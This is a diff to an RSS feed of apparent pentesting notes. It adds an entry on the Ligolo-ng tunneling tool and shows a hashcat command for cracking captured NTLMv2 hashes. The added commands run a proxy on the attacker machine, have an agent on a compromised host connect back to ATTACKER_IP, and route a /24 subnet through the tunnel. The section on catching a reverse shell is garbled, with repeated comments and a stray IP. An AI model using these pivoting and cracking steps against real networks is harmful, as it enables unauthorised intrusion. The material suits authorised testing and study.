@@ -4,7 +4,7 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Fri, 24 Feb 2023 20:25:38 GMT</lastBuildDate>
+        <lastBuildDate>Fri, 24 Feb 2023 20:34:23 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
         <item>
@@ -28,6 +28,36 @@
 At this point, you have two options, either relay the hash to try and have an open session or you can take the hash and try to crack it offline by running hashcat on it using the following command (depending on where you're running it, its best to run it on your host system) :</p>
 <div><pre class="hljs"><code>hashcat -m 5600 hashes.txt dictionary.txt</code></pre></div>
 <p>Check for more : <a>Hashcat</a></p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Ligolo-Ng]]></title>
+            <guid>b409cfd9358d495babe052bfe717752e</guid>
+            <pubDate>Fri, 18 Feb 2022 10:01:21 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="ligolo-ng-httpsgithubcomtnpitsecurityligolo-ng"><code>Ligolo-ng</code> | <a title="https://github.com/tnpitsecurity/ligolo-ng" href="https://github.com/tnpitsecurity/ligolo-ng">https://github.com/tnpitsecurity/ligolo-ng</a></h1>
+<p><code>An advanced, yet simple, tunneling tool that uses a TUN interface. Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).</code></p>
+<hr />
+<p><img src="/_resources/283c070bdb1c41b5a73fb0bc6390e311.png" /></p>
+<h2 id="setup-ligolo-ng">Setup Ligolo-ng</h2>
+<p><code>Creating a Tun Interface</code></p>
+<div><pre class="hljs"><code># Before running ligolo-ng proxy, you must create a tuntap virtual <span class="hljs-keyword">interface</span>
+<span class="hljs-symbol">sudo</span> <span class="hljs-symbol">ip</span> <span class="hljs-symbol">tuntap</span> <span class="hljs-symbol">add</span> <span class="hljs-symbol">user</span> <span class="hljs-symbol">kali</span> <span class="hljs-symbol">mode</span> <span class="hljs-symbol">tun</span> <span class="hljs-symbol">ligolo</span>
+<span class="hljs-symbol">sudo</span> <span class="hljs-symbol">ip</span> <span class="hljs-symbol">link</span> <span class="hljs-symbol">set</span> <span class="hljs-symbol">ligolo</span> <span class="hljs-symbol">up</span></code></pre></div>
+<p><code>Connecting to a Ligolo-Agent</code></p>
+<div><pre class="hljs"><code><span class="hljs-comment"># 1. On the attacking machine :</span>
+<span class="hljs-string">./proxy</span> -selfcert -laddr 0.0.0.0<span class="hljs-function">:9901</span>
+
+<span class="hljs-comment"># 2. On each compromised host with the network that you want to pivot to</span>
+<span class="hljs-string">./agent</span> -connect ATTACKER_IP<span class="hljs-function">:9901</span></code></pre></div>
+<h2 id="agent-bindinglistening">Agent Binding/Listening</h2>
+<p><code>Agent Binding/listening will allow you to capture a reverse shell from an internal network and forward it through the ligolo VPN. You can then launch a netcan from the attacking machine</code></p>
+<div><pre class="hljs"><code><span class="hljs-comment"># 1. On the attacking machine :</span>
+
+<span class="hljs-comment"># 1. On the attacking machine :</span>
+<span class="hljs-comment"># 1. On the attacking machine :</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-number">132.227.118.20</span>
+sudo ip route add <span class="hljs-number">132</span>.<span class="hljs-number">227</span>.<span class="hljs-number">118</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> dev ligolo
+</code></pre></div>
 ]]></content:encoded>
         </item>
     </channel>
